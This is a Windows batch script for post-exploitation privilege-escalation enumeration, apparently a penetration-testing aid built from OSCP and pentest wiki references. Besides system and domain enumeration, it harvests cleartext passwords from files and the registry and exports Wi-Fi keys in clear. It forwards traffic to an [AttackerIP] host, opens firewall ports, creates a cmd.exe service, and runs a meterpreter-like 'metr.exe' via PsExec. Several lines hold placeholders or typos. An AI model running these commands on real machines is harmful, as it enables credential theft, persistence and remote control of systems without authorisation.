REM Author: Gilles Biagomba
REM Program: wind0z_Pr1v3sc.bat
REM Description: This script is designed to perform windows checks for privilege escalation
REM Ref: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
REM http://pwnwiki.io/#!privesc/windows/index.md
REM https://hackmag.com/security/elevating-privileges-to-administrative-and-further/
REM https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/Windows_AD_commands.md
REM http://pwnwiki.io/#!privesc/windows/uac.md

@echo off

REM downloading dependencies
cd %HOMEPATH%/Donwloads/
bitsadmin /transfer n "https://download.sysinternals.com/files/PSTools.zip"
REM bitsadmin /transfer n "https://github.com/silentsignal/wpc/archive/refs/heads/wpc-2.0.zip"
REM bitsadmin /transfer n "https://github.com/pentestmonkey/windows-privesc-check/archive/refs/heads/master.zip"
jar xf PSTools.zip
REM jar xf wpc-2.0.zip
REM jar xf master.zip
echo

REM Basics
echo "Basic Enumeration of the System"
systeminfo
hostname
echo

REM Who am I?
echo "Obtainting whoami"
whoami
echo %username%
echo

REM What users/localgroups are on the machine?
echo "What users/localgroups are on the machine?"
net users
net localgroups
echo

REM More info about a specific user. Check if user has privileges.
REM net user user1

REM View Domain Groups
echo "View Domain Groups"
net group /domain
echo

REM View Members of Domain Group
REM net group /domain <Group Name>

REM Additional net comments
echo "Running additional net commands"
net view
net view /domain
net view /domain:Cable
net view \\domain-control
net user
net user /domain
net localgroup administrators
net localgroup administrators /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
net group "Domain Controllers" /domain
net group "Group Policy Creator Owners" /domain
net time /domain
net config
net session
net use \\ip\ipc$ password /user:username
net share
net accounts /domain
echo

REM Network
echo "Basic network info"
ipconfig /all
ipconfig /displaydns
route print
arp -A
echo

REM Show connections
echo "Showing Connections"
netstat -ano
netstat -ano -p tcp
netstat -ano -p udp
echo

REM Firewall
echo "Showing firewall information"
netsh firewall show state
netsh firewall show config
echo

REM more fw & networking
echo "Showing more firewall & network info"
netsh firewall show conf
netsh firewall set service type = remotedesktop mode = enable
netsh firewall add allowedprogram C:\nltest.exe mltest enable
netsh firewall add portopening tcp 2482 lt enable all
netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80
netsh wlan show profiles
netsh wlan export profile folder=. key=clear
netsh wlan set hostednetwork mode=[allow\|disallow]
netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
netsh wlan [start|stop] hostednetwork
echo

REM How well patched is the system?
echo "How well patched is the system"
wmic qfe get Caption,Description,HotFixID,InstalledOn
echo

REM using more vmic commands
echo "Using more vmic commands"
wmic useraccount
wmic useraccount LIST FULL
wmic useraccount LIST BRIEF
wmic useraccount LIST STATUS
wmic startup
wmic share
wmic service
wmic process where name="[PROCESS]" call terminate
wmic process where ProcessId="[PID]" call terminate
wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"
wmic qfe get hotfixid
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
wmic bios
wmic bios LIST FULL
wmic volume LIST BRIE
echo

REM Shows information about processes locally
echo "Shows information about processes locally "
qprocess * /SERVER:%COMPUTERNAME%
echo

REM Searching scheduled Tasks
echo "Searching scheduled Tasks"
tasklist /V
tasklist /M
tasklist /FI "IMAGENAME eq cmd.exe"
tasklist /FI "PID eq 4060"
echo

REM Search for them
echo "Cleartext Passwords"
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
echo

REM Find all those strings in config files.
echo "Find all those strings in config files"
dir /s *pass* == *cred* == *vnc* == *.config*
echo

REM Find all passwords in all files.
echo "Find all passwords in all files"
findstr /spin "password" *.*
findstr /spin "password" *.*
echo

REM More passwords In files
echo "More passwords In files"
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
echo

REM VNC
echo "Quering the registry - VNC"
reg query "HKCU\Software\ORL\WinVNC3\Password"
echo

REM Windows autologin
echo "Quering the registry - autologin"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
echo

REM SNMP Paramters
echo "Quering the registry - SNMP"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
echo

REM Putty
echo "Quering the registry - PuTTY"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
echo

REM AlwaysInstallElevated
echo "Quering the registry - AlwaysInstallElevated"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
echo

REM Search for password in registry
echo "Quering the registry - Passwords"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
echo

REM Service only available from inside
echo "Service only available from inside"
netstat -ano
echo

REM Scheduled Tasks
echo "Scheduled Tasks"
schtasks /query /fo LIST /v
echo

REM Weak Service Permissions
echo "Weak Service Permissions"
wmic service list brief
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
echo

REM sc.exe
echo "Using the service controller"
sc query
sc qc service name
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys
type Servicenames.txt
type services.txt
type path.txt
echo

REM Migrate the meterpreter shell
echo "Migrate the meterpreter shell"
wmic process list brief | find "winlogon"
echo

REM Using WMIC
echo "Find Services With Unquoted Paths"
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
echo

REM How to search such directories/ files
echo "search such directories/ files"
accesschk.exe -uwdqs users c:\
accesschk.exe -uwdqs “Authenticated Users” c:\
accesschk.exe -uwqs users c:\*.*
accesschk.exe -uwqs “Authenticated Users” c:\*.*
accesschk.exe –uwcqv *
echo

REM Ssearch for process Permissions
echo "Ssearch for process Permissions"
cd %ProgramFiles%
dir  /s /b *.exe | findstr /v .exe. >> %HOMEPATH%\Downloads\process.txt
FOR /F %%G IN ('"dir  /s /b *.exe | findstr /v .exe."') DO icacls "%%G"
FOR /F %%G IN ('"dir  /s /b *.exe | findstr /v .exe."') DO cacls "%%G"
echo "Look for Binary_path_name and see if it is unquoted."
echo

REM List all drivers
echo "Vulnerable Drivers"
driverquery
echo

REM Lost auto launch
echo "Lost auto launch"
autorunsc.exe -a | findstr /n /R "File\ not\ found"
echo

REM Using PsTools
%HOMEPATH%/Donwloads/PsExec.exe \\%COMPUTERNAME% -accepteula -c -f -h -d metr.exe
%HOMEPATH%/Donwloads/PsLoggedon.exe \\%COMPUTERNAME% 2>NUL | find "gbiago909" >NUL
echo

REM Misc
echo "Script included gathers data about the system and stores output in files in the"
c:\windows\system32\gathernetworkinfo.vbs
echo

REM PUlling GPO
echo ": Extremely verbose output of GPO (Group policy) settings as applied to the current system and user"
gpresult /z
